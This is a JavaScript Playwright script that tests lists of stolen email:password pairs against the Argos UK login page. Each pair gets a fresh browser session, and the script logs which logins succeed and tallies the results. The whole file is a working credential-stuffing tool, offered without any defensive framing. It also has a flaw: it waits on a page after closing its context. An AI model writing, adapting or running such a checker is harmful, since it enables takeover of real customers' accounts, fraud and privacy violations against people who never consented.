// runner.js
const { chromium } = require('playwright');

function parseLine(line) {
  const match = line.match(
    /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s]+)/
  );
  if (!match) return null;
  return { email: match[1], password: match[2] };
}

if (!process.env.LOGINS) {
  console.log('❌ No LOGINS received');
  process.exit(0);
}

const LOGIN_URL = 'https://www.argos.co.uk/login';
const logins = process.env.LOGINS.split('\n').filter(Boolean);

(async () => {
  const browser = await chromium.launch({ headless: true });

  let ok = 0;
  let fail = 0;

  for (const line of logins) {
    const parsed = parseLine(line);
    if (!parsed) {
      console.log('SKIPPED:', line);
      continue;
    }

    const { email, password } = parsed;
    console.log(`➡️ Trying ${email}`);

    // 🔐 NEW SESSION PER LOGIN
    const context = await browser.newContext();
    const page = await context.newPage();

    try {
      await page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded' });

      await page.fill('input[type="email"]', email);
      await page.fill('input[type="password"]', password);
      await page.click('button:has-text("Sign in securely")');

      // ✅ SUCCESS = login form gone
      await page.waitForSelector(
        'input[type="email"]',
        { state: 'detached', timeout: 7000 }
      );

      console.log(`✅ ${email}`);
      ok++;
    } catch (err) {
      console.log(`❌ ${email}`);
      fail++;
    } finally {
      await context.close();
    }

    await page.waitForTimeout(1500);
  }

  console.log(`\nRESULTS`);
  console.log(`OK: ${ok}`);
  console.log(`FAIL: ${fail}`);

  await browser.close();
})();